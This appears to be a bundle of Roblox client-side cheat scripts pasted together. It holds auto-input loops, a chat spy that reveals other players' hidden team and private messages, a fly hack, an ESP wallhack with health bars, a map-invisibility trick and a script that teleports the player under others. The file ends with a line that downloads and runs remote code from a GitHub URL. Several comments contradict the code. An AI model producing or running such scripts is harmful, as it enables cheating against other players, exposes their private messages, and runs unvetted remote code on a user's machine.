local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Function to open the first item in the player's inventory
local function openFirstItem()
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        local firstItem = backpack:GetChildren()[1] -- Get the first item
        if firstItem and firstItem:IsA("Tool") then
            LocalPlayer.Character.Humanoid:EquipTool(firstItem) -- Equip it
        end
    end
end

-- Function to handle respawn event
local function onCharacterAdded()
    task.wait(2) -- Wait 3 seconds after spawning
    openFirstItem() -- Open the first item in inventory
end

-- Listen for respawn and trigger the function
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

local player = game.Players.LocalPlayer

local function onCharacterAdded(character)
    -- Wait a bit for the character to fully load
    task.wait(2)

    -- Simulate pressing the "R" key
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.R, false, nil)
    task.wait(0.1) -- Wait briefly to simulate key press duration
    game:GetService("VirtualInputManager"):SendKeyEvent(false, Enum.KeyCode.R, false, nil)
end

-- Call the function for the current character if it exists
if player.Character then
    onCharacterAdded(player.Character)
end

-- Connect the function to the CharacterAdded event to handle respawn
player.CharacterAdded:Connect(onCharacterAdded)

enabled = true --chat "/spy" to toggle!
spyOnMyself = true --if true will check your messages too
public = false --if true will chat the logs publicly (fun, risky)
publicItalics = true --if true will use /me to stand out
privateProperties = { --customize private logs
	Color = Color3.fromRGB(0,255,255); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
 

local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance
 
local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)=="/spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end
 
for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)

local Players = game:GetService("Players")
local InputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local LocalPlayer = Players.LocalPlayer
local flySpeed = 3 -- Your desired fly speed

-- Helper function for safe normalization
local function safeUnit(v)
    return v.Magnitude > 0 and v.Unit or Vector3.zero
end

-- Fly function
RunService.Stepped:Connect(function(delta)
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        return
    end

    -- Check if the player is typing in chat
    if InputService:GetFocusedTextBox() then
        -- Maintain position in the air
        LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0) -- Reset horizontal velocity
        return -- Skip movement for directional controls
    end

    -- Reset vertical velocity to prevent falling
    LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)

    -- Directional controls
    local x, y, z = 0, 0, 0

    if InputService:IsKeyDown(Enum.KeyCode.W) then
        z -= 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.S) then
        z += 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.D) then
        x += 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.A) then
        x -= 1
    end
    --[[ If you want the player to go up and down using space and right shift remove this tag
    if InputService:IsKeyDown(Enum.KeyCode.Space) then
        y += 1
    end
    if InputService:IsKeyDown(Enum.KeyCode.LeftShift) then
        y -= 1
    end
    --]]

    -- Normalize movement direction to prevent excessive speed
    local direction = safeUnit(Camera.CFrame:VectorToWorldSpace(Vector3.new(x, 0, z)))

    -- Apply slower movement based on flySpeed, scaled for smoothness
    LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame 
        + (direction + Vector3.new(0, y, 0)) * flySpeed * delta * 0.1 -- Reduce speed scaling
end)

local lplr = game.Players.LocalPlayer
local camera = game:GetService("Workspace").CurrentCamera
local worldToViewportPoint = camera.worldToViewportPoint

_G.TeamCheck = false -- Toggle TeamCheck to True or False
local EspHealth = true -- Track if ESP Health is enabled

local HeadOff = Vector3.new(0, 0.5, 0)
local LegOff = Vector3.new(0, 3, 0)

-- Function to create ESP elements
local function CreateESPElements()
    local BoxOutline = Drawing.new("Square")
    BoxOutline.Color = Color3.new(0, 0, 0)
    BoxOutline.Thickness = 3
    BoxOutline.Transparency = 1
    BoxOutline.Filled = false
    BoxOutline.Visible = false

    local Box = Drawing.new("Square")
    Box.Color = Color3.new(1, 1, 1)
    Box.Thickness = 1
    Box.Transparency = 1
    Box.Filled = false
    Box.Visible = false

    local HealthBarOutline = Drawing.new("Square")
    HealthBarOutline.Thickness = 3
    HealthBarOutline.Filled = false
    HealthBarOutline.Color = Color3.new(0, 0, 0)
    HealthBarOutline.Transparency = 1
    HealthBarOutline.Visible = false

    local HealthBar = Drawing.new("Square")
    HealthBar.Thickness = 1
    HealthBar.Filled = false
    HealthBar.Transparency = 1
    HealthBar.Visible = false

    return BoxOutline, Box, HealthBarOutline, HealthBar
end

-- Function to update ESP elements
local function UpdateESP(v, BoxOutline, Box, HealthBarOutline, HealthBar)
    game:GetService("RunService").RenderStepped:Connect(function()
        if EspHealth and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("HumanoidRootPart") and v ~= lplr and v.Character.Humanoid.Health > 0 then
            local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)

            local RootPart = v.Character.HumanoidRootPart
            local Head = v.Character.Head
            local RootPosition = worldToViewportPoint(camera, RootPart.Position)
            local HeadPosition = worldToViewportPoint(camera, Head.Position + HeadOff)
            local LegPosition = worldToViewportPoint(camera, RootPart.Position - LegOff)

            if onScreen then
                BoxOutline.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
                BoxOutline.Position = Vector2.new(RootPosition.X - BoxOutline.Size.X / 2, RootPosition.Y - BoxOutline.Size.Y / 2)
                BoxOutline.Visible = true

                Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
                Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
                Box.Visible = true

                HealthBarOutline.Size = Vector2.new(2, HeadPosition.Y - LegPosition.Y)
                HealthBarOutline.Position = BoxOutline.Position - Vector2.new(6, 0)
                HealthBarOutline.Visible = true

                local maxHealth = v.Character:FindFirstChild("Humanoid").MaxHealth
                local health = v.Character:FindFirstChild("Humanoid").Health
                HealthBar.Size = Vector2.new(2, (HeadPosition.Y - LegPosition.Y) * (health / maxHealth))
                HealthBar.Position = Vector2.new(Box.Position.X - 6, Box.Position.Y + (1 / HealthBar.Size.Y))
                HealthBar.Color = Color3.fromRGB(255 - 255 * (health / maxHealth), 255 * (health / maxHealth), 0)
                HealthBar.Visible = true

                if v.TeamColor == lplr.TeamColor and _G.TeamCheck then
                    BoxOutline.Visible = false
                    Box.Visible = false
                    HealthBarOutline.Visible = false
                    HealthBar.Visible = false
                else
                    BoxOutline.Visible = true
                    Box.Visible = true
                    HealthBarOutline.Visible = true
                    HealthBar.Visible = true
                end
            else
                BoxOutline.Visible = false
                Box.Visible = false
                HealthBarOutline.Visible = false
                HealthBar.Visible = false
            end
        else
            BoxOutline.Visible = false
            Box.Visible = false
            HealthBarOutline.Visible = false
            HealthBar.Visible = false
        end
    end)
end

-- Create ESP elements for existing players
for _, v in pairs(game.Players:GetPlayers()) do
    if v ~= lplr then
        local BoxOutline, Box, HealthBarOutline, HealthBar = CreateESPElements()
        coroutine.wrap(function() UpdateESP(v, BoxOutline, Box, HealthBarOutline, HealthBar) end)()
    end
end

-- Handle new players
game.Players.PlayerAdded:Connect(function(v)
    if v ~= lplr then
        local BoxOutline, Box, HealthBarOutline, HealthBar = CreateESPElements()
        coroutine.wrap(function() UpdateESP(v, BoxOutline, Box, HealthBarOutline, HealthBar) end)()
    end
end)

local function makeEverythingInvisible()
    -- Loop through all objects and make them invisible
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            obj.Transparency = 1  -- Make the part invisible
            obj.CanCollide = false  -- Prevent collision with invisible parts
        end
    end

    -- Ensure your character stays visible
    local character = game.Players.LocalPlayer.Character
    if character then
        for _, part in pairs(character:GetChildren()) do
            if part:IsA("BasePart") then
                part.Transparency = 0  -- Keep your character visible
                part.CanCollide = true  -- Ensure your character can collide
            end
        end
    end

    -- Make sure other players' characters stay visible
    game.Players.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(character)
            if player ~= game.Players.LocalPlayer then
                for _, part in pairs(character:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Transparency = 0  -- Keep other players' characters visible
                        part.CanCollide = true  -- Ensure collision for other players
                    end
                end
            end
        end)
    end)

    print("[💨 Everything Invisible | Players Visible]")
end

makeEverythingInvisible()

-- Listen for respawn and trigger the function
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)


local Players = game:GetService("Players")
local player = Players.LocalPlayer

if player and player.Character then
    player.CameraMode = Enum.CameraMode.Classic
    player.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local hrp = Character:WaitForChild("HumanoidRootPart")

local targetPlayer = nil -- Current player to follow

-- Function to smoothly follow under a player
local function followUnderPlayer()
    RunService.RenderStepped:Connect(function()
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and hrp then
            local targetHRP = targetPlayer.Character.HumanoidRootPart
            -- Keep position directly below target at -15 on Y-axis
            hrp.CFrame = targetHRP.CFrame * CFrame.new(0, -15, 0)
        end
    end)
end

-- Function to update the local player's character (handles respawn)
local function onCharacterAdded(newCharacter)
    Character = newCharacter
    hrp = Character:WaitForChild("HumanoidRootPart") -- Get new HumanoidRootPart
    followUnderPlayer() -- Restart floating under player
end

-- Loop through players and update target every 2 seconds
spawn(function()
    while true do
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                targetPlayer = player
                wait(1) -- Switch player every 2 seconds
            end
        end
    end
end)

-- Listen for respawns and update character
LocalPlayer.CharacterAdded:Connect(onCharacterAdded)

-- Start following under players
followUnderPlayer()

local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")
local Player = game.Players.LocalPlayer

local function pressRKey()
    while true do
        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.R, false, game) -- Press R
        wait(0.1)
        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.R, false, game) -- Release R
        wait(12) -- Wait 5 seconds before pressing again
    end
end

-- Function to start the loop even after resetting
local function startAutoKeyPresser()
    task.spawn(pressRKey) -- Start pressing R every 5 seconds
end

-- Start when script runs
startAutoKeyPresser()

-- Restart when you respawn
Player.CharacterAdded:Connect(function()
    startAutoKeyPresser()
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/faisal31312/elemental/refs/heads/main/elemental"))()
